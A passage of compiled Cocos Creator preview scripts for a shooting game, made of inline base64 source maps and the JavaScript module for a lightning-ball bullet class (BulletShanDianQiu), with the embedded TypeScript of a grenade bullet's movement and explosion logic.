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QUFJLENBQUMsS0FBSyxHQUFHLEdBQUcsQ0FBQztRQUN0QyxvQkFBb0IsQ0FBQyxJQUFJLENBQUMsUUFBUSxHQUFHLElBQUksQ0FBQyxNQUFNLEVBQUUsR0FBQyxHQUFHLENBQUM7UUFDdkQsb0JBQW9CLENBQUMsSUFBSSxFQUFFLENBQUM7UUFDNUIscUJBQVMsQ0FBQyxJQUFJLENBQUMscUJBQVMsQ0FBQyxLQUFLLENBQUMsV0FBVyxFQUFFLElBQUksRUFBRSxDQUFDLEVBQUUsQ0FBQyxDQUFDLENBQUM7SUFDNUQsQ0FBQztJQTNIZ0IsZUFBZTtRQURuQyxPQUFPO09BQ2EsZUFBZSxDQTRIbkM7SUFBRCxzQkFBQztDQTVIRCxBQTRIQyxDQTVINEMsZ0JBQU0sR0E0SGxEO2tCQTVIb0IsZUFBZSIsImZpbGUiOiIiLCJzb3VyY2VSb290IjoiLyIsInNvdXJjZXNDb250ZW50IjpbIlxyXG5pbXBvcnQgQnVsbGV0IGZyb20gXCIuL0J1bGxldFwiO1xyXG5pbXBvcnQgRmFjYWRlIGZyb20gXCIuLi8uLi8uLi8uLi9mcmFtZXdvcmsvZmFjYWRlL0ZhY2FkZVwiO1xyXG5pbXBvcnQge0dhbWVQcm94eX0gZnJvbSBcIi4uLy4uL2dhbWUvR2FtZVByb3h5XCI7XHJcbmltcG9ydCB7V29ybGR9IGZyb20gXCIuLi8uLi9pbmZvL1dvcmxkXCI7XHJcbmltcG9ydCB7RXhjZWxDb25maWd9IGZyb20gXCIuLi8uLi8uLi8uLi9mcmFtZXdvcmsvY29uZmlnL0V4Y2VsQ29uZmlnXCI7XHJcbmltcG9ydCB7RXhjZWxUYWJsZU5hbWVzfSBmcm9tIFwiLi4vLi4vY29uZmlnL0V4Y2VsVGFibGVOYW1lc1wiO1xyXG5cclxuY29uc3Qge2NjY2xhc3MsIHByb3BlcnR5fSA9IGNjLl9kZWNvcmF0b3I7XHJcblxyXG5AY2NjbGFzc1xyXG5leHBvcnQgZGVmYXVsdCBjbGFzcyBCdWxsZXRPZlNob3VMZWkgZXh0ZW5kcyBCdWxsZXQge1xyXG5cclxuICAgIHByaXZhdGUgX3NrZTpzcC5Ta2VsZXRvbiA9IG51bGw7XHJcblxyXG4gICAgcHJpdmF0ZSBfYm91bmRzOmNjLlJlY3QgPSBjYy5yZWN0KCk7XHJcblxyXG4gICAgcHJpdmF0ZSBfZ2FtZUV4cGxvc2l2ZXNDb250cm9sbGVyID0gbnVsbDtcclxuXHJcblxyXG4gICAgc3RyaWtlKG90aGVyLCBzZWxmKTogdm9pZCB7XHJcbiAgICAgICAgLy8gc3VwZXIuc3RyaWtlKG90aGVyLCBzZWxmKTtcclxuICAgIH1cclxuXHJcbiAgICBpbml0KGlkOiBudW1iZXIpOiB2b2lkIHtcclxuICAgICAgICB0aGlzLmJ1bGxldElkID0gaWQ7XHJcbiAgICAgICAgbGV0IGNmZyA9IEV4Y2VsQ29uZmlnLmdldEV4Y2VsVGFibGUoRXhjZWxUYWJsZU5hbWVzLlByb3ApW3RoaXMuYnVsbGV0SWQtMV07XHJcbiAgICAgICAgdGhpcy5iVGhyb3VnaHQgPSBjZmdbJ3BpZXJjZSddID09PSAxO1xyXG4gICAgICAgIHRoaXMucmVwZWwgPSBjZmdbJ3JlcGVsJ107XHJcbiAgICAgICAgdGhpcy5zdGlmZiA9IGNmZ1snc3RpZmYnXTtcclxuICAgICAgICBsZXQgY29uZmlnID0gRXhjZWxDb25maWcuZ2V0RXhjZWxUYWJsZShFeGNlbFRhYmxlTmFtZXMuV2VhcG9uKVswXTtcclxuICAgICAgICB0aGlzLmh1cnQgPSBNYXRoLmZsb29yKGNvbmZpZ1snaHVydCddKldvcmxkLk15LmFybW9yeS5odXJ0TXVsT2YoMSkpKmNmZ1snaHVydCddO1xyXG4gICAgICAgIGxldCBiZ05vZGUgPSBjYy5maW5kKCdDYW52YXMnKS5nZXRDaGlsZEJ5TmFtZSgnR2FtZVNjZW5lJykuZ2V0Q2hpbGRCeU5hbWUoJ3NoYWtlTm9kZScpLmdldENoaWxkQnlOYW1lKCdiZycpO1xyXG4gICAgICAgIHRoaXMuX2JvdW5kcy54ID0gLSBiZ05vZGUud2lkdGgvMjtcclxuICAgICAgICB0aGlzLl9ib3VuZHMueSA9IC0gYmdOb2RlLmhlaWdodC8yO1xyXG4gICAgICAgIHRoaXMuX2JvdW5kcy53aWR0aCA9IGJnTm9kZS53aWR0aDtcclxuICAgICAgICB0aGlzLl9ib3VuZHMuaGVpZ2h0ID0gYmdOb2RlLmhlaWdodDtcclxuICAgIH1cclxuXHJcblxyXG4gICAgb25Mb2FkKCk6IHZvaWQge1xyXG4gICAgICAgIHN1cGVyLm9uTG9hZCgpO1xyXG4gICAgICAgIHRoaXMuX3NrZSA9IHRoaXMuZ2V0Q29tcG9uZW50KHNwLlNrZWxldG9uKTtcclxuICAgICAgICB0aGlzLl9nYW1lRXhwbG9zaXZlc0NvbnRyb2xsZXIgPSBGYWNhZGUuZmluZENvbXBvbmVudChcIkdhbWVTY2VuZVwiLCBcIkdhbWVFeHBsb3NpdmVzQ29udHJvbGxlclwiKTtcclxuICAgIH1cclxuXHJcblxyXG4gICAgbW92ZShkaXI6IGNjLlZlYzIpOiB2b2lkIHtcclxuICAgICAgICBpZiAodGhpcy5ub2RlLnggPD0gdGhpcy5fYm91bmRzLnhNaW4gfHwgdGhpcy5ub2RlLnggPj0gdGhpcy5fYm91bmRzLnhNYXggfHwgdGhpcy5ub2RlLnkgPD0gdGhpcy5fYm91bmRzLnlNaW4gfHwgdGhpcy5ub2RlLnkgPj0gdGhpcy5fYm91bmRzLnlNYXgpe1xyXG4gICAgICAgICAgICB0aGlzLm5vZGUuYWN0aXZlID0gZmFsc2U7XHJcbiAgICAgICAgICAgIHJldHVybjtcclxuICAgICAgICB9XHJcbiAgICAgICAgdGhpcy5fc2tlLnNldEFuaW1hdGlvbigwLCBcImFuaW1hdGlvblwiLCB0cnVlKTtcclxuICAgICAgICAvKiog6K6h566X57uI54K5ICovXHJcbiAgICAgICAgbGV0IGRlc3RQb3MgPSBkaXIubXVsKHRoaXMuX2JvdW5kcy5oZWlnaHQrdGhpcy5fYm91bmRzLndpZHRoKTtcclxuICAgICAgICBsZXQgaW50ZXJzZWN0aW9ucyA9IFtdO1xyXG4gICAgICAgIGlmIChkaXIueCA+IDApe1xyXG4gICAgICAgICAgICAvL+WPs+i+ueeVjFxyXG4gICAgICAgICAgICBpZiAoZGVzdFBvcy54ID49IHRoaXMuX2JvdW5kcy54TWF4KXtcclxuICAgICAgICAgICAgICAgIGxldCBwb2ludCA9IGNjLnYyKCk7XHJcbiAgICAgICAgICAgICAgICBpZihjYy5JbnRlcnNlY3Rpb24ucExpbmVJbnRlcnNlY3QodGhpcy5ub2RlLnBvc2l0aW9uLCBkZXN0UG9zLCBjYy52Mih0aGlzLl9ib3VuZHMueE1heCwgdGhpcy5fYm91bmRzLnlNaW4pLCBjYy52Mih0aGlzLl9ib3VuZHMueE1heCwgdGhpcy5fYm91bmRzLnlNYXgpLCBwb2ludCkpe1xyXG4gICAgICAgICAgICAgICAgICAgIGludGVyc2VjdGlvbnMucHVzaChwb2ludCk7XHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICB9ZWxzZSBpZiAoZGlyLnggPCAwKSB7XHJcbiAgICAgICAgICAgIC8v5bem6L6555WMXHJcbiAgICAgICAgICAgIGlmIChkZXN0UG9zLnggPD0gdGhpcy5fYm91bmRzLnhNaW4pe1xyXG4gICAgICAgICAgICAgICAgbGV0IHBvaW50ID0gY2MudjIoKTtcclxuICAgICAgICAgICAgICAgIGlmKGNjLkludGVyc2VjdGlvbi5wTGluZUludGVyc2VjdCh0aGlzLm5vZGUucG9zaXRpb24sIGRlc3RQb3MsIGNjLnYyKHRoaXMuX2JvdW5kcy54TWluLCB0aGlzLl9ib3VuZHMueU1pbiksIGNjLnYyKHRoaXMuX2JvdW5kcy54TWluLCB0aGlzLl9ib3VuZHMueU1heCksIHBvaW50KSl7XHJcbiAgICAgICAgICAgICAgICAgICAgaW50ZXJzZWN0aW9ucy5wdXNoKHBvaW50KTtcclxuICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgfVxyXG4gICAgICAgIH1cclxuXHJcbiAgICAgICAgaWYgKGRpci55ID4gMCl7XHJcbiAgICAgICAgICAgIC8v5LiK6L6555WMXHJcbiAgICAgICAgICAgIGlmIChkZXN0UG9zLnkgPj0gdGhpcy5fYm91bmRzLnlNYXgpe1xyXG4gICAgICAgICAgICAgICAgbGV0IHBvaW50ID0gY2MudjIoKTtcclxuICAgICAgICAgICAgICAgIGlmKGNjLkludGVyc2VjdGlvbi5wTGluZUludGVyc2VjdCh0aGlzLm5vZGUucG9zaXRpb24sIGRlc3RQb3MsIGNjLnYyKHRoaXMuX2JvdW5kcy54TWluLCB0aGlzLl9ib3VuZHMueU1heCksIGNjLnYyKHRoaXMuX2JvdW5kcy54TWF4LCB0aGlzLl9ib3VuZHMueU1heCksIHBvaW50KSl7XHJcbiAgICAgICAgICAgICAgICAgICAgaW50ZXJzZWN0aW9ucy5wdXNoKHBvaW50KTtcclxuICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgfVxyXG4gICAgICAgIH1lbHNlIGlmIChkaXIueSA8IDApe1xyXG4gICAgICAgICAgICAvL+S4iui+ueeVjFxyXG4gICAgICAgICAgICBpZiAoZGVzdFBvcy55IDw9IHRoaXMuX2JvdW5kcy55TWluKXtcclxuICAgICAgICAgICAgICAgIGxldCBwb2ludCA9IGNjLnYyKCk7XHJcbiAgICAgICAgICAgICAgICBpZihjYy5JbnRlcnNlY3Rpb24ucExpbmVJbnRlcnNlY3QodGhpcy5ub2RlLnBvc2l0aW9uLCBkZXN0UG9zLCBjYy52Mih0aGlzLl9ib3VuZHMueE1pbiwgdGhpcy5fYm91bmRzLnlNaW4pLCBjYy52Mih0aGlzLl9ib3VuZHMueE1heCwgdGhpcy5fYm91bmRzLnlNaW4pLCBwb2ludCkpe1xyXG4gICAgICAgICAgICAgICAgICAgIGludGVyc2VjdGlvbnMucHVzaChwb2ludCk7XHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICB9XHJcblxyXG4gICAgICAgIGlmIChpbnRlcnNlY3Rpb25zLmxlbmd0aCA+IDApe1xyXG4gICAgICAgICAgICAvLyBjb25zb2xlLmxvZyhcIumHjeaWsOiuoeeul2Rlc3RQb3M9PT0+aW50ZXJzZWN0aW9uc1wiLCBpbnRlcnNlY3Rpb25zKTtcclxuICAgICAgICAgICAgLyoqIOmHjeaWsOiuoeeul2Rlc3RQb3MgKi9cclxuICAgICAgICAgICAgaWYgKGludGVyc2VjdGlvbnMubGVuZ3RoID09IDEpe1xyXG4gICAgICAgICAgICAgICAgZGVzdFBvcyA9IGludGVyc2VjdGlvbnNbMF07XHJcbiAgICAgICAgICAgIH0gZWxzZSB7XHJcbiAgICAgICAgICAgICAgICAvKiog5Y+W6Led56a75oCq54mp5pyA6L+R55qE6YKj5Liq54K5ICovXHJcbiAgICAgICAgICAgICAgICBsZXQgcCA9IGludGVyc2VjdGlvbnNbMF07XHJcbiAgICAgICAgICAgICAgICBsZXQgbWluRGlzdGFuY2UgPSBwLnN1Yih0aGlzLm5vZGUucG9zaXRpb24pLm1hZygpO1xyXG4gICAgICAgICAgICAgICAgZm9yIChsZXQgaT0xOyBpPGludGVyc2VjdGlvbnMubGVuZ3RoOyBpKyspe1xyXG4gICAgICAgICAgICAgICAgICAgIGxldCBtYWcgPSBpbnRlcnNlY3Rpb25zW2ldLnN1Yih0aGlzLm5vZGUucG9zaXRpb24pLm1hZygpO1xyXG4gICAgICAgICAgICAgICAgICAgIGlmIChtYWcgPCBtaW5EaXN0YW5jZSl7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHAgPSBpbnRlcnNlY3Rpb25zW2ldO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBtaW5EaXN0YW5jZSA9IG1hZztcclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICBkZXN0UG9zID0gcDtcclxuICAgICAgICAgICAgfVxyXG4gICAgICAgIH1cclxuXHJcbiAgICAgICAgbGV0IGRpc3RhbmNlID0gZGVzdFBvcy5zdWIodGhpcy5ub2RlLnBvc2l0aW9uKS5tYWcoKTtcclxuICAgICAgICBsZXQgc3BlZWQgPSA1MDtcclxuICAgICAgICBsZXQgYWN0aW9uID0gY2Muc2VxdWVuY2UoY2MubW92ZVRvKGRpc3RhbmNlL3NwZWVkLCBkZXN0UG9zKSwgY2MuY2FsbEZ1bmMoKCk9PntcclxuICAgICAgICAgICAgdGhpcy5ub2RlLmFjdGl2ZSA9IGZhbHNlO1xyXG4gICAgICAgIH0pKTtcclxuICAgICAgICB0aGlzLm5vZGUucnVuQWN0aW9uKGFjdGlvbik7XHJcbiAgICB9XHJcblxyXG4gICAgb25Db2xsaXNpb25FbnRlcihvdGhlciwgc2VsZik6IHZvaWQge1xyXG4gICAgICAgIC8qKiDniIbngrggKi9cclxuICAgICAgICB0aGlzLm5vZGUuYWN0aXZlID0gZmFsc2U7XHJcbiAgICAgICAgdGhpcy5ib29tKCk7XHJcbiAgICB9XHJcblxyXG4gICAgYm9vbSgpe1xyXG4gICAgICAgIGxldCBleHBsb3NpdmVIdW9KaWFuVG9uZyA9IHRoaXMuX2dhbWVFeHBsb3NpdmVzQ29udHJvbGxlci5nZXRJbmFjdGl2ZUV4cGxvc2l2ZSg5KTtcclxuICAgICAgICBleHBsb3NpdmVIdW9KaWFuVG9uZy5ub2RlLnBvc2l0aW9uID0gdGhpcy5ub2RlLnBvc2l0aW9uO1xyXG4gICAgICAgIGV4cGxvc2l2ZUh1b0ppYW5Ub25nLm5vZGUuYWN0aXZlID0gdHJ1ZTtcclxuICAgICAgICBleHBsb3NpdmVIdW9KaWFuVG9uZy5ub2RlLnNjYWxlID0gMC41O1xyXG4gICAgICAgIGV4cGxvc2l2ZUh1b0ppYW5Ub25nLm5vZGUucm90YXRpb24gPSBNYXRoLnJhbmRvbSgpKjM2MDtcclxuICAgICAgICBleHBsb3NpdmVIdW9KaWFuVG9uZy5ib29tKCk7XHJcbiAgICAgICAgR2FtZVByb3h5LmVtaXQoR2FtZVByb3h5LkV2ZW50LlNoYWtlU2NyZWVuLCAwLjA4LCAyLCAyKTtcclxuICAgIH1cclxufVxyXG4iXX0=
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/entities/bullet/BulletShanDianQiu.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, 'd6485tJEkdMoIplWDIZNrRd', 'BulletShanDianQiu');
// script/app/entities/bullet/BulletShanDianQiu.ts

Object.defineProperty(exports, "__esModule", { value: true });
var Bullet_1 = require("./Bullet");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var BulletShanDianQiu = /** @class */ (function (_super) {
    __extends(BulletShanDianQiu, _super);
    function BulletShanDianQiu() {
        return _super !== null && _super.apply(this, arguments) || this;
    }
    BulletShanDianQiu.prototype.strike = function (other, self) {
        var gameBulletsController = window['GameBulletsController'];
        var bulletStrike = gameBulletsController.getInactiveBulletStrike(this.bulletId);
        bulletStrike.node.active = true;
        bulletStrike.node.position = cc.v2();
        bulletStrike.node.rotation = this.node.rotation;
        bulletStrike.node.setContentSize(other.node.getContentSize());
        bulletStrike.node.removeFromParent(false);
        bulletStrike.node.setParent(other.node);
        var spriteNode = bulletStrike.spriteNode;
        bulletStrike.node.rotation = Math.random() * 360;
        bulletStrike.node.runAction(cc.sequence(cc.repeat(cc.sequence(cc.delayTime(0.05), cc.callFunc(function () {
            spriteNode.active = !spriteNode.active;
            // bulletStrike.node.rotation = Math.random()*360;
        })), 6), cc.callFunc(function () {
            bulletStrike.node.stopAllActions();
            bulletStrike.node.active = false;
            bulletStrike.node.removeFromParent(false);
            bulletStrike.node.setParent(gameBulletsController.bulletLayer);
        })));
    };
    BulletShanDianQiu.prototype.fly = function (dir, distance, speed) {
        _super.prototype.fly.call(this, dir, distance, speed);
        this.node.scale = 0.3;
        this.node.runAction(cc.scaleTo(distance / speed, distance / 300));
    };
    BulletShanDianQiu = __decorate([
        ccclass
    ], BulletShanDianQiu);
    return BulletShanDianQiu;
}(Bullet_1.default));
exports.default = BulletShanDianQiu;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2VudGl0aWVzL2J1bGxldC9CdWxsZXRTaGFuRGlhblFpdS50cyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiOzs7Ozs7Ozs7Ozs7Ozs7O0FBQ0EsbUNBQThCO0FBR3hCLElBQUEsS0FBc0IsRUFBRSxDQUFDLFVBQVUsRUFBbEMsT0FBTyxhQUFBLEVBQUUsUUFBUSxjQUFpQixDQUFDO0FBRzFDO0lBQStDLHFDQUFNO0lBQXJEOztJQXFDQSxDQUFDO0lBbkNHLGtDQUFNLEdBQU4sVUFBTyxLQUFLLEVBQUUsSUFBSTtRQUNkLElBQUkscUJBQXFCLEdBQUcsTUFBTSxDQUFDLHVCQUF1QixDQUFDLENBQUM7UUFDNUQsSUFBSSxZQUFZLEdBQUcscUJBQXFCLENBQUMsdUJBQXVCLENBQUMsSUFBSSxDQUFDLFFBQVEsQ0FBQyxDQUFDO1FBQ2hGLFlBQVksQ0FBQyxJQUFJLENBQUMsTUFBTSxHQUFHLElBQUksQ0FBQztRQUNoQyxZQUFZLENBQUMsSUFBSSxDQUFDLFFBQVEsR0FBRyxFQUFFLENBQUMsRUFBRSxFQUFFLENBQUM7UUFDckMsWUFBWSxDQUFDLElBQUksQ0FBQyxRQUFRLEdBQUcsSUFBSSxDQUFDLElBQUksQ0FBQyxRQUFRLENBQUM7UUFDaEQsWUFBWSxDQUFDLElBQUksQ0FBQyxjQUFjLENBQUMsS0FBSyxDQUFDLElBQUksQ0FBQyxjQUFjLEVBQUUsQ0FBQyxDQUFDO1FBQzlELFlBQVksQ0FBQyxJQUFJLENBQUMsZ0JBQWdCLENBQUMsS0FBSyxDQUFDLENBQUM7UUFDMUMsWUFBWSxDQUFDLElBQUksQ0FBQyxTQUFTLENBQUMsS0FBSyxDQUFDLElBQUksQ0FBQyxDQUFDO1FBRXhDLElBQUksVUFBVSxHQUEyQixZQUFhLENBQUMsVUFBVSxDQUFDO1FBQ2xFLFlBQVksQ0FBQyxJQUFJLENBQUMsUUFBUSxHQUFHLElBQUksQ0FBQyxNQUFNLEVBQUUsR0FBQyxHQUFHLENBQUM7UUFDL0MsWUFBWSxDQUFDLElBQUksQ0FBQyxTQUFTLENBQUMsRUFBRSxDQUFDLFFBQVEsQ0FDbkMsRUFBRSxDQUFDLE1BQU0sQ0FDTCxFQUFFLENBQUMsUUFBUSxDQUNQLEVBQUUsQ0FBQyxTQUFTLENBQUMsSUFBSSxDQUFDLEVBQ2xCLEVBQUUsQ0FBQyxRQUFRLENBQUM7WUFDUixVQUFVLENBQUMsTUFBTSxHQUFHLENBQUMsVUFBVSxDQUFDLE1BQU0sQ0FBQztZQUN2QyxrREFBa0Q7UUFDdEQsQ0FBQyxDQUFDLENBQ0wsRUFBRSxDQUFDLENBQUMsRUFDVCxFQUFFLENBQUMsUUFBUSxDQUFDO1lBQ1IsWUFBWSxDQUFDLElBQUksQ0FBQyxjQUFjLEVBQUUsQ0FBQztZQUNuQyxZQUFZLENBQUMsSUFBSSxDQUFDLE1BQU0sR0FBRyxLQUFLLENBQUM7WUFDakMsWUFBWSxDQUFDLElBQUksQ0FB